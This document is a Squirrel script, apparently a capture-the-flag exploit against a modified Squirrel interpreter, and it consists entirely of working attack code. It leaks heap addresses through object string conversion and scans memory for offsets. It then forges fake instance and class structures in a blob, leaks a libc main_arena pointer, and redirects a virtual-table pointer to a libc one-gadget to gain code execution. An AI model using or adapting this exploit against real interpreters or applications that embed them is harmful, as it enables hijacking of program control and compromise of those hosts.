function get_addy(obj){
    local l = tostring.pcall(obj)
    local idx = l.find("0x")
    while(idx>=0){
        l = l.slice(idx+2)
        idx = l.find("0x")
    }
    return l.slice(0,-1).tointeger(16)
}

function ip2st(){
    local a = 0x1337414243441337
    "INJECT"
    "EJECT"
    return a
}

function load_opcodes(){
    "INJECT"
    "EJECT"
    ip2st()
}

function load_opcodes_cmp(){
    "INJECT"
    "EJECT"
    ip2st()
}

function map_offset(a = 0x4343434343434343){

}
::base_addr <- get_addy(map_offset)
print(format("[*] base: 0x%016x\n",::base_addr))
local offset = 0
::cmp <- 0x4343434343434343
for(local i = 400; i< 8*1024; i+=1){
    ::r <- i
    load_opcodes_cmp()
    if(::r){
        print(i+" Found\n");
        offset = (i+0x1)
        break
    }
}

print(format("[*] base_offset: 0x%016x\n",offset))

::r<-offset


load_opcodes()

::base_offset<-(offset-8)
function addr2offset(addr){
    local o = (addr-::base_addr)>>4
    return (o + ::base_offset)& 0xFFFFFFFF
}

function offset2addr(offset){
    local o = (offset-::base_offset)<<4
    return (o + ::base_addr)
}

function pwn(err){
    local a = ::r
    local b = blob(4)
    "INJECT"
    b.writen(0x00,'i')
    "EJECT"
    print(a)
}

local b = blob(1024) #set main_arena pointer
b.writen(0x05000002,'i')
b.writen(0x00,'i')
b.writen(0x4142434445464748,'l')
b.writen(0x05000002,'i')
b.writen(0x00,'i')
b.writen(0x4141414141414141,'l')

::cmp <- 0x4142434445464748
for(local i = 400; i< 8*1024; i+=1){
    ::r <- i
    load_opcodes_cmp()
    if(::r){
        print(i+" Found\n");
        offset = (i+0x2)
        break
    }
}

local add = offset2addr(offset)
print(format("[*] blob is at 0x%016x\n", add))

#fake native instance
b.writen(0xa008000,'i')
b.writen(0x00,'i')
b.writen(add+0x10*3,'l')

::r<-addr2offset(add+1024-0x10)
load_opcodes()

local l_main = get_addy(::r)
local l_offset = 0x1eb080
local oneg_offset = 0xe6b99
print(format("[*] libc_main_arena leak: 0x%016x\n", l_main))
if(l_offset!=0x00){
    print(format("[*] libc base: 0x%016x\n",l_main-l_offset))
    #fake instance
    b.writen(0x0,'l') #vptr
    b.writen(0x0,'l') #vptr
    b.writen(0x0,'l') #vptr
    b.writen(0x0,'l') #vptr
    b.writen(0x0,'l') #vptr
    b.writen(0x0,'l') #uiref
    b.writen(0x0,'l') #weakref
    b.writen(0x0,'l') #_next
    b.writen(0x0,'l') #_prev
    b.writen(0x0,'l') #_shared_sate
    b.writen(0x0,'l') #_delegate
    b.writen(add+0x10*3+0x8*13,'l') #_class
    b.writen(add+0x10*3+0x8*13,'l') #_userpointer
    b.writen(0x0,'l') #_hook
    b.writen(0x0,'l') #_memsize
    b.writen(0x0,'l') #_values[0].type
    b.writen(0x0,'l') #_values[0].val

    #fake blob _class
    b.writen(add+0x10*3+0x8*(13+21+0x12*2)-0x40,'l') #vptr
    b.writen(0x0,'l') #uiref
    b.writen(0x0,'l') #weakref
    b.writen(0x0,'l') #_next
    b.writen(0x0,'l') #_prev
    b.writen(0x0,'l') #_shared_sate
    b.writen(0x0,'l') #_members
    b.writen(0x0,'l') #_base
    b.writen(0x0,'l') #_default_values._vals
    b.writen(0x0,'l') #_default_values._size
    b.writen(0x0,'l') #_default_values._allocated
    b.writen(0x0,'l') #_methods._vals
    b.writen(0x0,'l') #_methods._size
    b.writen(0x0,'l') #_methods._allocated
    for(local i = 0; i<0x12;i+=1){
        b.writen(0x0,'l') #_metamoethods.type
        b.writen(0x0,'l') #_metamoethods.val    
    }
    b.writen(0x0,'l') #_attributes.type
    b.writen(0x0,'l') #_attributes.val
    b.writen(0x0000000080000000,'l') #_typetag
    b.writen(0x0,'l') #_hook
    b.writen(0x0,'l') #_locked
    b.writen(0x0,'l') #_constructoridx
    b.writen(0x0,'l') #_udsize
    b.writen(l_main-l_offset+oneg_offset,'l')

    ::r<-addr2offset(add-0x30)
    load_opcodes()
    pwn(b)
}else{
    print("[!] libc offset is not set...\n")
}
